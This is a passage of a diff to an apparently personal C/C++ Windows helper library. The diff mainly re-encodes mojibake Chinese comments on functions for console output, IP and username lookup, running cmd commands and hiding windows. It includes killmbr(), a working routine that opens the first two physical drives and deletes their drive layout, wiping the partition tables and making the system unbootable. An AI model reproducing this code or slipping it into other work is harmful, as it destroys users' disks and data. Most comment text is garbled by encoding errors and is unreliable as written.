+	//æŠŠçª—å£ç¼“å†²åŒºå…¨éƒ¨å¡«å……ä¸ºç©ºæ ¼å¹¶å¡«å……ä¸ºé»˜è®¤é¢œè‰²ï¼ˆæ¸…å±ï¼‰
 	FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
 	FillConsoleOutputAttribute(hdout, csbi.wAttributes, size, pos, &num);
-	SetConsoleCursorPosition(hdout, pos); //¹â±ê¶¨Î»µ½´°¿Ú×óÉÏ½Ç
+	SetConsoleCursorPosition(hdout, pos); //å…‰æ ‡å®šä½åˆ°çª—å£å·¦ä¸Šè§’
 }
 
 /**************************************************
- *  @brief          strÉ¾³ı¿Õ¸ñ
- *  @param          s:ÒªÉ¾³ı¿Õ¸ñµÄstring±äÁ¿
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h>
- *  @Sample usage   delspace(ÒªÉ¾³ı¿Õ¸ñµÄstring±äÁ¿);
+ *  @brief          stråˆ é™¤ç©ºæ ¼
+ *  @param          s:è¦åˆ é™¤ç©ºæ ¼çš„stringå˜é‡
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h>
+ *  @Sample usage   delspace(è¦åˆ é™¤ç©ºæ ¼çš„stringå˜é‡);
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2021/9/14
@@ -1184,10 +1184,10 @@ void delspace(string &s)
 }
 
 /**************************************************
- *  @brief          »ñµÃµ±Ç°ip
- *  @note           Í·ÎÄ¼ş£º #include <WinSock2.h>	±àÒëÊ±¼Ó-lgdi32 -lwsock32
+ *  @brief          è·å¾—å½“å‰ip
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <WinSock2.h>	ç¼–è¯‘æ—¶åŠ -lgdi32 -lwsock32
  *  @Sample usage   ip();
- *  @return         ±¾»úÖ÷Íø¿¨ip
+ *  @return         æœ¬æœºä¸»ç½‘å¡ip
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2021/9/23
@@ -1204,10 +1204,10 @@ string getIp()
 }
 
 /**************************************************
- *  @brief          »ñµÃµ±Ç°ÓÃ»§Ãû
+ *  @brief          è·å¾—å½“å‰ç”¨æˆ·å
  *  @Sample usage   GetUser();
- *  @return      	µ±Ç°ÓÃ»§Ãû
- *  @note		    Í·ÎÄ¼ş£º #include<Windows.h>
+ *  @return      	å½“å‰ç”¨æˆ·å
+ *  @note		    å¤´æ–‡ä»¶ï¼š #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/2/28
@@ -1217,15 +1217,15 @@ string GetUser()
 {
 	char currentUser[256] = {0};
 	DWORD dwSize_currentUser = 256;
-	GetUserName(currentUser, &dwSize_currentUser); //»ñµÃÓÃ»§Ãû
+	GetUserName(currentUser, &dwSize_currentUser); //è·å¾—ç”¨æˆ·å
 	return currentUser;
 }
 
 /**************************************************
- *  @brief          »ñµÃÏµÍ³°æ±¾
+ *  @brief          è·å¾—ç³»ç»Ÿç‰ˆæœ¬
  *  @Sample usage   GetSystemVersion();
- *  @return         ÏµÍ³°æ±¾
- *  @note		    Í·ÎÄ¼ş£º #include<Windows.h>
+ *  @return         ç³»ç»Ÿç‰ˆæœ¬
+ *  @note		    å¤´æ–‡ä»¶ï¼š #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        4.0
  *  @date           2021/2/24
@@ -1258,9 +1258,9 @@ string GetSystemVersion()
 }
 
 /**************************************************
- *  @brief          Ö´ĞĞcmdÃüÁî²¢»ñµÃ·µ»ØÖµ
+ *  @brief          æ‰§è¡Œcmdå‘½ä»¤å¹¶è·å¾—è¿”å›å€¼
  *  @Sample usage   getCmdResult("echo 1");
- *  @return         ·µ»ØÖµ
+ *  @return         è¿”å›å€¼
  *  @author         xbebhxx3
  *  @version        2.0
  *  @date           2022/3/5
@@ -1279,10 +1279,10 @@ char *getCmdResult(char *Cmd)
 }
 
 /**************************************************
- *  @brief          ¾ÓÖĞÊä³ö
- *  @param          str:ÒªÊä³öµÄ×Ö·û´®,y:Êä³öµ½µÚ¼¸ĞĞ;
- *  @Sample usage   OutoutMiddle(×Ö·û´®,ĞĞÊı);
- *  @note	        Í·ÎÄ¼ş£º #include<Windows.h>
+ *  @brief          å±…ä¸­è¾“å‡º
+ *  @param          str:è¦è¾“å‡ºçš„å­—ç¬¦ä¸²,y:è¾“å‡ºåˆ°ç¬¬å‡ è¡Œ;
+ *  @Sample usage   OutoutMiddle(å­—ç¬¦ä¸²,è¡Œæ•°);
+ *  @note	        å¤´æ–‡ä»¶ï¼š #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/8
@@ -1291,42 +1291,42 @@ char *getCmdResult(char *Cmd)
 void OutoutMiddle(const char str[], int y)
 {
 	COORD pos;
-	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //»ñµÃÊä³öµÄ¾ä±ú
+	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //è·å¾—è¾“å‡ºçš„å¥æŸ„
 	CONSOLE_SCREEN_BUFFER_INFO bInfo;
-	GetConsoleScreenBufferInfo(hOutput, &bInfo); //»ñÈ¡¿ØÖÆÌ¨ÆÁÄ»»º³åÇø´óĞ¡
+	GetConsoleScreenBufferInfo(hOutput, &bInfo); //è·å–æ§åˆ¶å°å±å¹•ç¼“å†²åŒºå¤§å°
 	int dwSizeX = bInfo.dwSize.X, dwSizey = bInfo.dwSize.Y;
-	int len = strlen(str); //»ñÈ¡ÒªÊä³öµÄ×Ö·û´®µÄ³¤¶È
+	int len = strlen(str); //è·å–è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦
 	int x = dwSizeX / 2 - len / 2;
-	pos.X = x;								//ºá×ø±ê
-	pos.Y = y;								//×İ×ø±ê
-	SetConsoleCursorPosition(hOutput, pos); //ÒÆ¶¯¹â±ê
-	printf("%s", str);						//Êä³ö
+	pos.X = x;								//æ¨ªåæ ‡
+	pos.Y = y;								//çºµåæ ‡
+	SetConsoleCursorPosition(hOutput, pos); //ç§»åŠ¨å…‰æ ‡
+	printf("%s", str);						//è¾“å‡º
 }
 
-//Òş²Ø´°¿Ú #include<Windows.h>
+//éšè—çª—å£ #include<Windows.h>
 void HideWindow()
 {
 	ShowWindow(GetForegroundWindow(), SW_HIDE);
 }
 
-//Õæ¡¤È«ÆÁ ×î´ó»¯ È¡Ïû±êÌâÀ¸¼°±ß¿ò#include<Windows.h>
+//çœŸÂ·å…¨å± æœ€å¤§åŒ– å–æ¶ˆæ ‡é¢˜æ åŠè¾¹æ¡†#include<Windows.h>
 void full_screen()
 {
 	HWND hwnd = GetForegroundWindow();
-	int cx = GetSystemMetrics(SM_CXSCREEN); /* ÆÁÄ»¿í¶È ÏñËØ */
-	int cy = GetSystemMetrics(SM_CYSCREEN); /* ÆÁÄ»¸ß¶È ÏñËØ */
+	int cx = GetSystemMetrics(SM_CXSCREEN); /* å±å¹•å®½åº¦ åƒç´  */
+	int cy = GetSystemMetrics(SM_CYSCREEN); /* å±å¹•é«˜åº¦ åƒç´  */
 
-	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* »ñÈ¡´°¿ÚĞÅÏ¢ */
-	/* ÉèÖÃ´°¿ÚĞÅÏ¢ ×î´ó»¯ È¡Ïû±êÌâÀ¸¼°±ß¿ò */
+	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* è·å–çª—å£ä¿¡æ¯ */
+	/* è®¾ç½®çª—å£ä¿¡æ¯ æœ€å¤§åŒ– å–æ¶ˆæ ‡é¢˜æ åŠè¾¹æ¡† */
 	SetWindowLong(hwnd, GWL_STYLE, (l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
 
 	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx + 18, cy, 0);
 }
 
 /**************************************************
- *  @brief          ÆÆ»µmbr(very danger)
+ *  @brief          ç ´åmbr(very danger)
  *  @Sample usage   killmbr();
- *  @note		    Í·ÎÄ¼ş£º #include<Windows.h> #include<ntddscsi.h>
+ *  @note		    å¤´æ–‡ä»¶ï¼š #include<Windows.h> #include<ntddscsi.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/8
@@ -1336,7 +1336,7 @@ void full_screen()
 void killmbr(){
 	DWORD lpBytesReturned;
 	OVERLAPPED lpOverlapped={0};
-	HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//ÆÆ»µmbr
+	HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//ç ´åmbr
 	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
 	DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
